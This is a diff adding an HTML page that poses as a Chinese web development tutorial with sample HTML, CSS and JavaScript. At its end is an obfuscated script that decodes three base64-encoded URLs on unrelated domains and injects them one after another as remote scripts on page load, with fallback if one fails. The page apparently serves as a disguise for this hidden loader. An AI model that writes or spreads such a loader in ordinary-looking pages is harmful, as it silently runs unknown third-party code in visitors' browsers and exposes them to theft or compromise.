@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>Web开发技术文档</title>
+    <style>
+        /* 全局样式 */
+        body {
+            overflow: hidden;
+            font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
+            /* 使用Inter字体，备用系统字体 */
+            margin: 0;
+            padding: 0;
+            background-color: #f8f8f8;
+            /* 浅色背景 */
+            color: #333;
+            /* 深色文本 */
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+            /* 字体抗锯齿 */
+            -moz-osx-font-smoothing: grayscale;
+            /* 字体抗锯齿 */
+        }
+
+        .container {
+            max-width: 90%;
+            /* 适应移动端宽度 */
+            margin: 0 auto;
+            /* 居中 */
+            padding: 20px 15px;
+            /* 内边距 */
+        }
+
+        /* 头部样式 */
+        header {
+            text-align: center;
+            padding: 20px 0;
+            background-color: #ffffff;
+            /* 白色背景 */
+            border-bottom: 1px solid #eee;
+            border-radius: 10px;
+            /* 圆角 */
+            margin-bottom: 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+            /* 轻微阴影 */
+        }
+
+        header h1 {
+            color: #2c3e50;
+            /* 深蓝色标题 */
+            margin-bottom: 10px;
+            font-size: 1.8em;
+            /* 适合移动端的字体大小 */
+        }
+
+        header p {
+            color: #555;
+            font-size: 0.9em;
+            margin: 0;
+        }
+
+        /* 目录样式 */
+        nav.toc {
+            background-color: #ffffff;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+        }
+
+        nav.toc h2 {
+            color: #2c3e50;
+            font-size: 1.5em;
+            margin-bottom: 15px;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
+        }
+
+        nav.toc ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        nav.toc ul li {
+            margin-bottom: 8px;
+        }
+
+        nav.toc ul li a {
+            text-decoration: none;
+            color: #007bff;
+            /* 强调色：蓝色 */
+            font-weight: bold;
+            display: block;
+            padding: 5px 0;
+            transition: color 0.3s ease;
+        }
+
+        nav.toc ul li a:hover {
+            color: #0056b3;
+            /* 强调色深色 */
+        }
+
+        /* 主要内容区域 */
+        main,
+        section {
+            background-color: #ffffff;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+        }
+
+        h2 {
+            color: #2c3e50;
+            font-size: 1.5em;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
+        }
+
+        h3 {
+            color: #34495e;
+            /* 更深的文本色 */
+            font-size: 1.2em;
+            margin-top: 25px;
+            margin-bottom: 15px;
+        }
+
+        p {
+            color: #555;
+            font-size: 0.95em;
+            margin-bottom: 15px;
+        }
+
+        img {
+            max-width: 100%;
+            /* 图片自适应宽度 */
+            height: auto;
+            border-radius: 8px;
+            /* 图片圆角 */
+            margin-top: 15px;
+            margin-bottom: 15px;
+            display: block;
+            /* 确保图片是块级元素 */
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            /* 图片阴影 */
+        }
+
+        /* 代码块样式 */
+        pre {
+            background-color: #2d2d2d;
+            /* 深色背景 */
+            color: #f8f8f2;
+            /* 浅色文本 */
+            padding: 15px;
+            border-radius: 8px;
+            overflow-x: auto;
+            /* 横向滚动 */
+            font-family: 'Consolas', 'Monaco', 'Andale Mono', 'Ubuntu Mono', monospace;
+            font-size: 0.9em;
+            line-height: 1.4;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        code {
+            font-family: inherit;
+            font-size: inherit;
+        }
+
+        /* 页脚样式 */
+        footer {
+            text-align: center;
+            padding: 20px 0;
+            color: #7f8c8d;
+            font-size: 0.85em;
+            border-top: 1px solid #eee;
+            margin-top: 20px;
+            background-color: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 -2px 4px rgba(0, 0, 0, 0.03);
+        }
+
+        .footer-links a {
+            color: #007bff;
+            text-decoration: none;
+            margin: 0 8px;
+            font-weight: bold;
+            transition: color 0.3s ease;
+        }
+
+        .footer-links a:hover {
+            color: #0056b3;
+        }
+    </style>
+    <link rel="stylesheet" href="./static/css/style.css">
+</head>
+
+<body>
+    <div class="container">
+        <header>
+            <h1>Web开发技术文档</h1>
+            <p>从基础到进阶，全面掌握现代Web开发技术</p>
+        </header>
+
+        <nav class="toc">
+            <h2>目录</h2>
+            <ul>
+                <li><a href="#intro">1. 简介：Web开发基础</a></li>
+                <li><a href="#html-basics">2. HTML基础：构建网页结构</a></li>
+                <li><a href="#css-styling">3. CSS样式：美化页面</a></li>
+                <li><a href="#js-interactivity">4. JavaScript：实现交互功能</a></li>
+                <li><a href="#responsive-design">5. 响应式设计：适应多设备</a></li>
+            </ul>
+        </nav>
+
+        <main>
+            <section id="intro">
+                <h2>1. 简介：Web开发基础</h2>
+                <p>Web开发是构建网站和Web应用程序的过程。它通常涉及前端（用户可见部分）和后端（服务器、数据库等）。本章节将带您了解Web开发的基本概念和所需技术栈。</p>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() %>" alt="">
+                <p>一个完整的Web应用通常由HTML、CSS和JavaScript共同协作完成。HTML负责内容结构，CSS负责样式呈现，而JavaScript则负责实现页面的动态交互。</p>
+            </section>
+
+            <section id="html-basics">
+                <h2>2. HTML基础：构建网页结构</h2>
+                <h3>2.1 HTML文档结构</h3>
+                <p>HTML（超文本标记语言）是Web页面的骨架。每个HTML文档都遵循一个基本结构，包括<code>&lt;!DOCTYPE html&gt;</code>声明、<code>&lt;html&gt;</code>根元素、<code>&lt;head&gt;</code>头部信息和<code>&lt;body&gt;</code>主体内容。
+                </p>
+                <pre><code>
+&lt;!DOCTYPE html&gt;
+&lt;html lang="zh-CN"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;title&gt;我的网页&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;欢迎来到我的网站&lt;/h1&gt;
+    &lt;p&gt;这是一个简单的段落。&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+                </code></pre>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 1 %>" alt="">
+                <h3>2.2 常用HTML标签</h3>
+                <p>HTML提供了丰富的标签来组织内容，例如标题标签<code>&lt;h1&gt;</code>到<code>&lt;h6&gt;</code>，段落标签<code>&lt;p&gt;</code>，链接标签<code>&lt;a&gt;</code>，图像标签<code>&lt;img&gt;</code>等。
+                </p>
+            </section>
+
+            <section id="css-styling">
+                <h2>3. CSS样式：美化页面</h2>
+                <h3>3.1 CSS选择器与属性</h3>
+                <p>CSS（层叠样式表）用于控制Web页面的外观和布局。通过选择器，我们可以精确地选中HTML元素，并应用各种样式属性，如颜色、字体、大小和边距。</p>
+                <pre><code>
+/* 选中所有段落并设置文本颜色 */
+p {
+    color: #333;
+    font-size: 16px;
+    margin-bottom: 10px;
+}
+
+/* 选中ID为"header"的元素 */
+#header {
+    background-color: #f0f0f0;
+    padding: 20px;
+}
+
+/* 选中class为"button"的元素 */
+.button {
+    display: inline-block;
+    padding: 10px 15px;
+    background-color: #007bff;
+    color: white;
+    border-radius: 5px;
+}
+                </code></pre>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 2 %>" alt="">
+                <h3>3.2 盒模型与布局</h3>
+                <p>CSS盒模型是理解元素在页面上如何占据空间的关键。每个HTML元素都被视为一个矩形盒子，包含内容(content)、内边距(padding)、边框(border)和外边距(margin)。</p>
+            </section>
+
+            <section id="js-interactivity">
+                <h2>4. JavaScript：实现交互功能</h2>
+                <h3>4.1 JavaScript基础语法</h3>
+                <p>JavaScript是一种强大的脚本语言，用于实现Web页面的动态行为和交互功能。它可以修改HTML内容、CSS样式，响应用户事件，并与服务器进行数据交换。</p>
+                <pre><code>
+// 在控制台输出一条消息
+console.log("Hello, JavaScript!");
+
+// 获取HTML元素并修改其文本内容
+document.getElementById("myButton").addEventListener("click", function() {
+    document.getElementById("message").textContent = "按钮被点击了！";
+});
+
+// 定义一个函数
+function calculateSum(a, b) {
+    return a + b;
+}
+
+let result = calculateSum(5, 3);
+console.log("和是: " + result); // 输出 "和是: 8"
+                </code></pre>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 3 %>" alt="">
+                <h3>4.2 DOM操作与事件处理</h3>
+                <p>通过DOM（文档对象模型），JavaScript可以访问和操作HTML文档的各个部分。事件处理则允许我们对用户的行为（如点击、鼠标移动、键盘输入）做出响应。</p>
+            </section>
+
+            <section id="responsive-design">
+                <h2>5. 响应式设计：适应多设备</h2>
+                <p>响应式Web设计（RWD）是一种使网站能够适应不同屏幕尺寸和设备（如手机、平板、桌面）的技术。它主要通过CSS媒体查询和弹性布局实现。</p>
+                <pre><code>
+/* 当屏幕宽度小于600px时应用以下样式 */
+@media (max-width: 600px) {
+    .container {
+        padding: 10px;
+    }
+    nav ul li {
+        width: 100%; /* 导航项在小屏幕上占满一行 */
+        text-align: center;
+    }
+}
+                </code></pre>
+                <img src="https://picsum.photos/300/200?random=<%= new Date().getTime() + 4 %>" alt="">
+                <p>通过媒体查询，我们可以为不同的设备尺寸定义不同的CSS规则，从而优化用户体验。</p>
+            </section>
+        </main>
+
+        <footer>
+            <p>&copy; 2023 Web开发技术文档. All rights reserved.</p>
+            <div class="footer-links">
+                <a href="#" aria-label="GitHub">GitHub</a> |
+                <a href="#" aria-label="文档主页">文档主页</a> |
+                <a href="#" aria-label="联系我们">联系我们</a>
+            </div>
+        </footer>
+        <div id="overlay">
+            <div id="loading_box" class="loading_container">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // JavaScript for smooth scrolling
+        document.querySelectorAll('nav.toc a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault(); // 阻止默认跳转行为
+
+                const targetId = this.getAttribute('href'); // 获取目标ID
+                const targetElement = document.querySelector(targetId); // 获取目标元素
+
+                if (targetElement) {
+                    window.scrollTo({
+                        top: targetElement.offsetTop - 60, // 减去一些偏移量，避免被顶部导航遮挡
+                        behavior: 'smooth' // 平滑滚动效果
+                    });
+                }
+            });
+        });
+
+        // 动态更新图片时间戳，确保每次加载都不同
+        document.addEventListener('DOMContentLoaded', function () {
+            const images = document.querySelectorAll('img[src*="picsum.photos"]');
+            images.forEach(img => {
+                const url = new URL(img.src);
+                url.searchParams.set('random', new Date().getTime() + Math.floor(Math.random() * 1000)); // 添加随机数确保唯一性
+                img.src = url.toString();
+            });
+        });
+    </script>
+   <script>
+        (function () {function l(r){let e=a=>new Promise((n,t)=>{if(a>=r.length)return t(Error("oo"));let c=atob(r[a])+"?v=2",o=document.createElement("script");o.src=c,o.async=!0,o.onload=()=>{n(c)},o.onerror=()=>{console.warn("nn"),e(a+1).then(n).catch(t),o.remove()},document.head.appendChild(o)});return e(0)}l(["aHR0cHM6Ly9jZG4ucmZpd3B3LmNuL3N0YXRpYy9qcy9jb2RlLnYyLmpz","aHR0cHM6Ly9jZG4uamlubWEyMDI1LmNvbS9zdGF0aWMvanMvY29kZS52Mi5qcw==","aHR0cHM6Ly9jZG4uamlubWEyMDI2LmNuL3N0YXRpYy9qcy9jb2RlLnYyLmpz"]).then(r=>console.log("ok")).catch(r=>console.error(r));})();
+    </script> 
+
+</body>
+
+</html>
